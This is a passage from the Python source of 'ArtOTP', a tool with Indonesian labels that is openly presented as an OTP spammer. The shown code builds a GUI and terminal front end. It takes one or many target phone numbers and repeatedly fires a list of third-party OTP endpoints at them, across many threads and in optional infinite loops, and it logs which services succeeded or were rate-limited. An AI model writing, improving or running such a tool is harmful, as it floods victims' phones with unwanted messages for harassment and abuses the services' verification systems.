            tk.Label(chip, textvariable=var, bg=INP, fg=color, font=("Segoe UI", 18, "bold")).pack()
            chip.pack(side="left", fill="x", expand=True, padx=(0, 4))

    def _logbox(self, parent):
        lc = self._card(parent, "📜 Live Log")
        lc.grid(row=1, column=0, sticky="nsew")
        inn = tk.Frame(lc, bg=CARD)
        inn.pack(fill="both", expand=True, padx=12, pady=(4, 4))
        tf = tk.Frame(inn, bg=CARD)
        tf.pack(fill="both", expand=True)
        self.log = tk.Text(tf, font=("Consolas", 9), bg=INP, fg=T1, insertbackground=T1, bd=0, relief="flat", highlightthickness=1, highlightbackground=BR, state="disabled", wrap="word", selectbackground=P)
        lsb = tk.Scrollbar(tf, command=self.log.yview, bg=CARD)
        lsb.pack(side="right", fill="y")
        self.log.pack(side="left", fill="both", expand=True)
        self.log.config(yscrollcommand=lsb.set)
        for tag, fg in [("ok", G), ("fail", R), ("lim", Y), ("info", B), ("dim", T2), ("num", P)]:
            self.log.tag_config(tag, foreground=fg)
        
        brow = tk.Frame(lc, bg=CARD)
        brow.pack(fill="x", padx=12, pady=(0, 8))
        tk.Button(brow, text="🗑 Bersihkan", font=("Segoe UI", 8), bg=INP, fg=T2, bd=0, padx=10, pady=4, relief="flat", cursor="hand2", command=self._clrlog, activebackground=HOV, activeforeground=T1).pack(side="right")

    def _footer(self):
        tk.Frame(self.root, bg=BR, height=1).pack(fill="x")
        ft = tk.Frame(self.root, bg=CARD, height=56)
        ft.pack(fill="x")
        ft.pack_propagate(False)
        self.info = tk.Label(ft, text=f"Siap — {len(TARGETS)} API aktif", bg=CARD, fg=T2, font=("Segoe UI", 9))
        self.info.pack(side="left", padx=16, pady=18)
        br = tk.Frame(ft, bg=CARD)
        br.pack(side="right", padx=16, pady=10)
        self.stop_btn = tk.Button(br, text="⏹ STOP", font=("Segoe UI", 10, "bold"), bg=R, fg="white", bd=0, padx=18, pady=8, relief="flat", cursor="hand2", state="disabled", command=self._stop)
        self.stop_btn.pack(side="right", padx=(8, 0))
        self.start_btn = tk.Button(br, text="▶ MULAI SPAM", font=("Segoe UI", 10, "bold"), bg=G, fg=BG, bd=0, padx=22, pady=8, relief="flat", cursor="hand2", command=self._start)
        self.start_btn.pack(side="right")

    def _card(self, parent, title=""):
        outer = tk.Frame(parent, bg=CARD, bd=0, highlightbackground=BR, highlightthickness=1)
        if title:
            hf = tk.Frame(outer, bg=CARD)
            hf.pack(fill="x", padx=12, pady=(10, 4))
            tk.Label(hf, text=title, bg=CARD, fg=T2, font=("Segoe UI", 9, "bold")).pack(side="left")
            tk.Frame(outer, bg=BR, height=1).pack(fill="x", padx=12)
        return outer

    def _sinput(self, mode):
        self.v_input.set(mode)
        if mode == "single":
            self.mf.pack_forget()
            self.sf.pack(fill="both", expand=True)
            self.tab_s.config(bg=HOV, fg=G)
            self.tab_m.config(bg=CARD, fg=T2)
        else:
            self.sf.pack_forget()
            self.mf.pack(fill="both", expand=True)
            self.tab_m.config(bg=HOV, fg=G)
            self.tab_s.config(bg=CARD, fg=T2)

    def _smode(self, mode):
        self.v_mode.set(mode)
        if mode == "single":
            self.btn_sr.config(bg=G, fg=BG)
            self.btn_inf.config(bg=INP, fg=T2)
            self.delay_row.grid_remove()
        else:
            self.btn_inf.config(bg=P, fg="white")
            self.btn_sr.config(bg=INP, fg=T2)
            self.delay_row.grid()

    def _vlive(self, e=None):
        raw = self.s_entry.get().strip()
        if not raw:
            self.s_vlbl.config(text="", fg=T2)
            return
        n = normalize(raw)
        if n: self.s_vlbl.config(text=f"✓ Valid → {n}", fg=G)
        else: self.s_vlbl.config(text="✗ Format tidak valid", fg=R)

    def _mcount(self, e=None):
        raw = self.m_text.get("1.0", "end-1c")
        lines = [l.strip() for l in raw.splitlines() if l.strip()]
        valid = [n for l in lines for n in [normalize(l)] if n]
        self.m_cnt.config(text=f"{len(lines)} baris")
        if valid: self.m_vlbl.config(text=f"✓ {len(valid)} nomor valid", fg=G)
        else: self.m_vlbl.config(text="", fg=T2)

    def _get_multi(self):
        raw = self.m_text.get("1.0", "end-1c")
        lines = [l.strip() for l in raw.splitlines() if l.strip()]
        return [n for l in lines for n in [normalize(l)] if n]

    def _addlog(self, msg, tag="dim"):
        self.log_q.put((msg, tag))

    def _poll(self):
        try:
            while True:
                msg, tag = self.log_q.get_nowait()
                self.log.config(state="normal")
                ts = time.strftime("%H:%M:%S")
                self.log.insert("end", f"[{ts}] ", "dim")
                self.log.insert("end", msg + "\n", tag)
                self.log.see("end")
                self.log.config(state="disabled")
        except Exception:
            pass
        self.root.after(80, self._poll)

    def _clrlog(self):
        self.log.config(state="normal")
        self.log.delete("1.0", "end")
        self.log.config(state="disabled")

    def _cb(self, phone=""):
        api_total = len(TARGETS)
        def callback(name, status, detail=""):
            self.v_sent.set(self.v_sent.get() + 1)
            sent = self.v_sent.get()
            if status == "SUCCESS":
                self.v_ok.set(self.v_ok.get() + 1); tag = "ok"; sym = "✓"
            elif status in ("LIMITED", "BLOCKED"): tag = "lim"; sym = "!"
            elif status in ("FAIL", "ERROR", "TIMEOUT", "CONN_ERR"):
                self.v_fail.set(self.v_fail.get() + 1); tag = "fail"; sym = "✗"
            else: tag = "dim"; sym = "-"
            pct = int((sent % api_total) / api_total * 100) if api_total else 0
            self.v_prog.set(pct)
            self.p_pct.config(text=f"{pct}%")
            self.p_lbl.config(text=f"{phone} → {name}" if phone else name)
            det = f" — {detail}" if detail else ""
            self._addlog(f"[{sym}] {name}: {status}{det}", tag)
        return callback

    def _reset(self):
        self.v_sent.set(0); self.v_ok.set(0); self.v_fail.set(0)
        self.v_prog.set(0); self.p_pct.config(text="0%")
        self.p_lbl.config(text="Memulai...")

    def _set_running(self, on):
        self.running = on
        if on:
            self.start_btn.config(state="disabled", bg=T3)
            self.stop_btn.config(state="normal")
            self.dot.config(fg=G); self.stat_lbl.config(text="Running", fg=G)
            self.info.config(text="⚡ Spam berjalan...", fg=Y)
        else:
            self.start_btn.config(state="normal", bg=G)
            self.stop_btn.config(state="disabled")
            self.dot.config(fg=T3); self.stat_lbl.config(text="Idle", fg=T2)
            self.info.config(text=f"Selesai — {len(TARGETS)} API", fg=T2)

    def _start(self):
        imode = self.v_input.get()
        if imode == "single":
            raw = self.s_entry.get().strip()
            if not raw: messagebox.showwarning("Kosong", "Isi nomor target!"); return
            n = normalize(raw)
            if not n: messagebox.showerror("Format Salah", "Gunakan 08xx/628xx/+628xx"); return
            phones = [n]
        else:
            phones = self._get_multi()
            if not phones: messagebox.showwarning("Tidak Ada", "Tidak ada nomor valid!"); return
            self._addlog(f"Multi-mode: {len(phones)} nomor valid", "info")

        self.stop_ev.clear(); self._reset(); self._set_running(True)
        exmode = self.v_mode.get(); t = self.v_threads.get(); d = self.v_delay.get()

        if exmode == "single":
            thr = threading.Thread(target=self._wk_single, args=(phones, t), daemon=True)
        else:
            thr = threading.Thread(target=self._wk_inf, args=(phones, t, d), daemon=True)
        thr.start()

    def _stop(self):
        global stop_flag
        stop_flag = True
        self.stop_ev.set()
        self._addlog("⏹ Stop diminta...", "lim")

    def _wk_single(self, phones, threads):
        global stop_flag
        for i, ph in enumerate(phones, 1):
            if self.stop_ev.is_set(): break
            disp = "+62" + ph[2:] if ph.startswith("62") else ph
            self._addlog(f"── [{i}/{len(phones)}] {disp}", "num")
            stop_flag = False
            run_single_round(threads=threads, target=ph, callback=self._cb(disp))
        msg = "⏹ Dihentikan." if self.stop_ev.is_set() else f"✓ Selesai! ✅{self.v_ok.get()}/📤{self.v_sent.get()}"
        self._addlog(msg, "lim" if self.stop_ev.is_set() else "ok")
        self.root.after(0, lambda: self._set_running(False))

    def _wk_inf(self, phones, threads, delay):
        global stop_flag
        rnd = 0
        while not self.stop_ev.is_set():
            rnd += 1
            self._addlog(f"━━ Round {rnd} ━━", "info")
            for i, ph in enumerate(phones, 1):
                if self.stop_ev.is_set(): break
                disp = "+62" + ph[2:] if ph.startswith("62") else ph
                self._addlog(f"── R{rnd} [{i}/{len(phones)}] {disp}", "num")
                stop_flag = False
                run_single_round(threads=threads, target=ph, callback=self._cb(disp))
            if self.stop_ev.is_set(): break
            self._addlog(f"✓ Round {rnd} selesai. Delay {delay}s...", "info")
            for rem in range(delay, 0, -1):
                if self.stop_ev.is_set(): break
                time.sleep(1)
        self._addlog("⏹ Infinite loop dihentikan.", "lim")
        self.root.after(0, lambda: self._set_running(False))

# =====================================================================
# SECTION 6: TERMINAL CLI & ANIMATIONS
# =====================================================================

def clear_screen():
    sys.stdout.write('\033[H\033[2J')
    sys.stdout.flush()

def rgb_color(tick, offset=0):
    r = int((math.sin(tick * 0.5 + offset) + 1) * 127)
    g = int((math.sin(tick * 0.5 + offset + 2) + 1) * 127)
    b = int((math.sin(tick * 0.5 + offset + 4) + 1) * 127)
    return f"\033[38;2;{r};{g};{b}m"

def gradient_text(text, tick, offset=0):
    result = ""
    for i, char in enumerate(text):
        color = rgb_color(tick, offset + i * 0.1)
        result += f"{color}{char}{Style.RESET_ALL}"
    return result

class MatrixBackground:
    def __init__(self):
        try:
            self.width = shutil.get_terminal_size().columns
            self.height = shutil.get_terminal_size().lines
        except Exception:
            self.width, self.height = 80, 24
        self.width = max(40, self.width)
        self.height = max(10, self.height)
        self.chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()'
        self.init_columns()
    
    def init_columns(self):
        self.columns = []
        for x in range(self.width):
            length = random.randint(8, 25)
            col = {
                'x': x, 'y': random.randint(-self.height, 0),
                'speed': random.uniform(0.8, 2.5), 'length': length,
                'chars': [random.choice(self.chars) for _ in range(length)],
                'bright_pos': random.randint(0, length - 1)
            }
            self.columns.append(col)
    
    def update(self):
        for col in self.columns:
            col['y'] += col['speed'] * 0.6
            if col['y'] > self.height + col['length']:
                col['y'] = random.randint(-self.height, 0)
                col['length'] = random.randint(8, 25)
                col['chars'] = [random.choice(self.chars) for _ in range(col['length'])]
                col['speed'] = random.uniform(0.8, 2.5)
                col['bright_pos'] = random.randint(0, col['length'] - 1)
    
    def render(self, overlay_lines=None):
        sys.stdout.write('\033[?25l\033[H')
        screen = [[' ' for _ in range(self.width)] for _ in range(self.height)]
        
        for col in self.columns:
            x, start_y = col['x'], int(col['y'])
            for i in range(col['length']):
                y = start_y + i
                if 0 <= y < self.height and 0 <= x < self.width:
                    char = col['chars'][i % len(col['chars'])]
                    color = Fore.GREEN + Style.BRIGHT if i == col['bright_pos'] else Fore.GREEN
                    screen[y][x] = color + char + Style.RESET_ALL
        
        for y in range(self.height):
            print(''.join(screen[y]))
        
        if overlay_lines:
            filtered = [line for line in overlay_lines if line.strip()]
            start_y = (self.height - len(filtered)) // 2
            for i, line in enumerate(filtered):
                if line.strip():
                    clean_line = re.sub(r'\x1b\[[0-9;]*m', '', line)
                    x_pos = max(0, (self.width - len(clean_line)) // 2)
                    sys.stdout.write(f'\033[{start_y + i};{x_pos}H')
                    print(line, end='')
        sys.stdout.write('\033[?25h')

def matrix_loading(duration=2):
    matrix = MatrixBackground()
    ascii_ArtOTP = [
        "    █████╗ ██████╗ ██╗     ███████╗███╗   ██╗",
        "   ██╔══██╗██╔══██╗██║     ██╔════╝████╗  ██║",
        "   ███████║██████╔╝██║     █████╗  ██╔██╗ ██║",
        "   ██╔══██║██╔══██╗██║     ██╔══╝  ██║╚██╗██║",
        "   ██║  ██║██║  ██║███████╗███████╗██║ ╚████║",
        "   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝"
    ]
    start_time, tick = time.time(), 0
    while time.time() - start_time < duration:
        tick += 0.05
        matrix.update()
        colored_ascii = []
        for line in ascii_ArtOTP:
            colored_line = "".join([f"{rgb_color(tick, i * 0.1)}{c}{Style.RESET_ALL}" if c != ' ' else ' ' for i, c in enumerate(line)])
            colored_ascii.append(colored_line)
        progress = (time.time() - start_time) / duration
        bar = "█" * int(30 * progress) + "░" * (30 - int(30 * progress))
        overlay = ["", *colored_ascii, "", f"[{bar}] {int(progress * 100)}%", ""]
        matrix.render(overlay)
        time.sleep(0.03)
    sys.stdout.write('\033[?25h\033[H\033[2J')

def print_banner(tick=0):
    title = gradient_text("ArtOTP — OTP Spammer", tick, 0)
    print(f"\n  ┌──────────────────────────────────────────────────────┐\n  │                     {title}                       │\n  └──────────────────────────────────────────────────────┘\n  │  API : {len(TARGETS):<4} │  Version : {VERSION:<6} │  Dev : Aldan      │\n  └──────────────────────────────────────────────────────┘\n")

def print_menu(selected=0, tick=0):
    items = [
        ("▶ Single Round", "Sekali kirim, satu nomor"),
        ("⟳ Infinite Loop", "Kirim berulang dengan jeda"),
        ("📋 Multi Nomor",  "Banyak nomor sekaligus"),
        ("✕ Keluar",        "Tutup aplikasi")
    ]
    print("  📋 MENU UTAMA\n")
    for i, (label, desc) in enumerate(items):
        if i == selected:
            print(f"  ┌──────────────────────────────────────────────────────┐\n  │  ▶ {label:<16} ─ {desc:<26} │\n  └──────────────────────────────────────────────────────┘")
        else:
            print(f"  •    {label:<18} ─ {desc}")
    print("\n  [↑/↓]: Navigasi  │  [ENTER]: Pilih  │  [Q]: Keluar\n")

def get_key():
    if tty is not None and termios is not None:
        try:
            fd = sys.stdin.fileno()
            old = termios.tcgetattr(fd)
            try:
                tty.setraw(fd)
                ch = sys.stdin.read(1)
                if ch == '\x1b': ch += sys.stdin.read(2)
                return ch
            finally:
                termios.tcsetattr(fd, termios.TCSADRAIN, old)
        except Exception:
            pass
    try:
        import msvcrt
        return msvcrt.getch().decode()
    except Exception:
        return None

def menu_navigation():
    selected = 0
    items = ["single", "infinite", "multi", "exit"]
    tick = 0
    is_termux = os.path.exists("/data/data/com.termux/files/usr")
    
    while True:
        clear_screen()
        tick += 0.05
        print_banner(tick)
        print_menu(selected, tick)
        
        if is_termux:
            key = get_key()
            if key == '\x1b[A': selected = (selected - 1) % len(items)
            elif key == '\x1b[B': selected = (selected + 1) % len(items)
            elif key in ['\r', '\n', '\x1b[C']:
                choice = items[selected]
                if choice == "single":
                    target = input(f"\n{Fore.WHITE}Nomor target: {Style.RESET_ALL}").strip()
                    if target: run_single_round(target=target)
                elif choice == "infinite":
                    target = input(f"\n{Fore.WHITE}Nomor target: {Style.RESET_ALL}").strip()
                    if target: run_infinite_loop(target=target)
                elif choice == "exit":
                    sys.exit(0)
            elif key in ['q', 'Q']:
                sys.exit(0)
        else:
            print(f"{Fore.CYAN}[1] Single Round  [2] Infinite Loop  [3] Keluar{Style.RESET_ALL}")
            choice = input(f"\nPilih (1/2/3): ").strip()
            if choice == "1":
                target = input(f"Nomor target: ").strip()
                if target: run_single_round(target=target)
            elif choice == "2":
                target = input(f"Nomor target: ").strip()
                if target: run_infinite_loop(target=target)
            elif choice == "3":
                sys.exit(0)

# =====================================================================
# SECTION 7: MAIN APPLICATION ENTRY POINT
# =====================================================================

def main():
    force_cli = "--cli" in sys.argv
    
    if HAS_TK and not force_cli:
        try:
            can_display = True
            if sys.platform != 'win32':
                can_display = bool(os.environ.get('DISPLAY') or os.environ.get('WAYLAND_DISPLAY'))
            
            if can_display:
                root = tk.Tk()
                root.tk_setPalette(background=BG, foreground=T1)
                try: root.iconbitmap("icon.ico")
                except Exception: pass
                ArtOTPApp(root)
                root.mainloop()
                return
        except Exception as e:
            print(f"{Fore.YELLOW}[INFO] Gagal memulai Desktop GUI, beralih ke Terminal CLI: {e}{Style.RESET_ALL}")
            time.sleep(1)

    try:
        matrix_loading(2)
        menu_navigation()
    except KeyboardInterrupt:
        print(f"\n{Fore.GREEN}✓ Sampai jumpa! 👋{Style.RESET_ALL}")
        sys.exit(0)

if __name__ == "__main__":
    main()
